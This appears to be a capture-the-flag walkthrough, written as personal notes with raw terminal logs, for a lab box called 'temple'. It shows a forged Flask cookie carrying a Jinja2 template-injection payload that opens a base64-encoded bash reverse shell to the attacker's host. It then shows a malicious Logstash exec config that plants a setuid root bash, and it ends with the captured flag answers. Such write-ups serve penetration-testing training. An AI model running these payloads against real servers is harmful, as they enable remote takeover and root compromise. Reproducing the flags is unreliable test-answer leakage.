──(kali㉿kali)-[~/Downloads/temple]
└─$ flask-unsign --sign --cookie "{'logged_in': True, 'username': '{{config.__class__.__init__.__globals__[\"os\"].popen(\"echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjE5LjEwMy8xMzM3IDA+JjEK | base64 -d | bash\").read()}}'}" --secret 'f#bKR!$@T7dCL4@By!MyYKqzMrReSGeNTC7X&@ry'
.eJwlyl0LgjAYBeC_Iu9VUnmRFuGdmEWlNwVBZYypa07mJk770Pzvjbo48JzD6YFLSkmGmAC3qVsygVaRWuCSgAt9n0pxZ9RCKOVYKYS0mGDND5TLBHM9XmOQKoabVcmKiFEMJM2lcS7XHfa9Bh-98Y55j8vmNAvtQ5H6y1fkO05YBHOdZ_TWvYvs7Ur_imBvfIwEK7JwjGn2dx6DadUEZyNzGGD4AmcvPM8.Y9CNlw.V4Jdzy5Tk8PmyAZAAwWsx6uW50c

copy to session cookie

.eJwlyl0LgjAYBeC_Iu9VUnmRFuGdmEWlNwVBZYypa07mJk770Pzvjbo48JzD6YFLSkmGmAC3qVsygVaRWuCSgAt9n0pxZ9RCKOVYKYS0mGDND5TLBHM9XmOQKoabVcmKiFEMJM2lcS7XHfa9Bh-98Y55j8vmNAvtQ5H6y1fkO05YBHOdZ_TWvYvs7Ur_imBvfIwEK7JwjGn2dx6DadUEZyNzGGD4AmcvPM8.Y9CNlw.V4Jdzy5Tk8PmyAZAAwWsx6uW50c


┌──(kali㉿kali)-[~/Downloads/temple]
└─$ rlwrap nc -lvnp 1337
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.47.191.
Ncat: Connection from 10.10.47.191:34360.
bash: cannot set terminal process group (895): Inappropriate ioctl for device
bash: no job control in this shell
bill@temple:~/webapp$ whoami
whoami
bill
bill@temple:~/webapp$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
bill@temple:~/webapp$ cd /etc/logstash
cd /etc/logstash
bill@temple:/etc/logstash$ ls
ls
conf.d       log4j2.properties     logstash.yml   startup.options
jvm.options  logstash-sample.conf  pipelines.yml
bill@temple:/etc/logstash$ cd conf.d
cd conf.d
bill@temple:/etc/logstash/conf.d$ cat *
cat *
# Sample Logstash configuration for creating a simple
# Beats -> Logstash -> Elasticsearch pipeline.

┌──(kali㉿kali)-[~/Downloads/temple]
└─$ cat logstash-sample2.conf 
input {
  exec {
    command => "cp /bin/bash /home/bill/shell; chmod +xs /home/bill/shell"
    interval => 5
  }
}

output {
  file {
    path => "/tmp/output.log"
    codec => rubydebug
  }
}

┌──(kali㉿kali)-[~/Downloads/temple]
└─$ python3 -m http.server 80   
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.47.191 - - [24/Jan/2023 21:08:07] "GET /logstash-sample2.conf HTTP/1.1" 200 -

bill@temple:/etc/logstash/conf.d$ curl http://10.8.19.103:80/logstash-sample2.conf -o logstash-sample.conf
<03:80/logstash-sample2.conf -o logstash-sample.conf
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:--  0     0    0     0    0     0      0      0 --:--:-- --:--:--100   194  100   194    0     0    439      0 --:--:-- --:--:-- --:--:--   440

bill@temple:~$ ls -lah
ls -lah
total 1.2M
drwxr-xr-x 6 bill bill 4.0K Jan 25 02:09 .
drwxr-xr-x 5 root root 4.0K Oct  3  2021 ..
lrwxrwxrwx 1 bill bill    9 Jul 25  2021 .bash_history -> /dev/null
-rw-r--r-- 1 bill bill  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 bill bill 3.7K Apr  4  2018 .bashrc
drwx------ 3 bill bill 4.0K Jul 24  2021 .cache
-rw-r--r-- 1 root root   41 Jul 25  2021 flag1.txt
drwx------ 3 bill bill 4.0K Jul 24  2021 .gnupg
drwx------ 4 bill bill 4.0K Jul 24  2021 .local
-rw-r--r-- 1 bill bill  807 Apr  4  2018 .profile
-rwsr-sr-x 1 root root 1.1M Jan 25 02:09 shell
drwxrwxr-x 3 bill bill 4.0K Jul 27  2021 webapp
bill@temple:~$ ./shell -p
./shell -p
shell-4.4# whoami
whoami
root
shell-4.4# cd /root
cd /root
shell-4.4# ls
ls
flag2.txt  script.sh
shell-4.4# cat flag2.txt
cat flag2.txt
f620630155081293669dbb7949f975fa9386f1cd
shell-4.4# cat script.sh
cat script.sh
#!/bin/bash
sleep 30
/bin/systemctl start logstash.service


```

![[Pasted image 20230124183644.png]]

![[Pasted image 20230124211040.png]]
Find flag1.txt

Enumerate! Does the word templ(at)e mean anything?

*7362bee1e78243f4811f26565137d5e20cbd9af0*

Find flag2.txt

Make sure to look carefully at the running processes.

*f620630155081293669dbb7949f975fa9386f1cd*


[[AllSignsPoint2Pwnage]]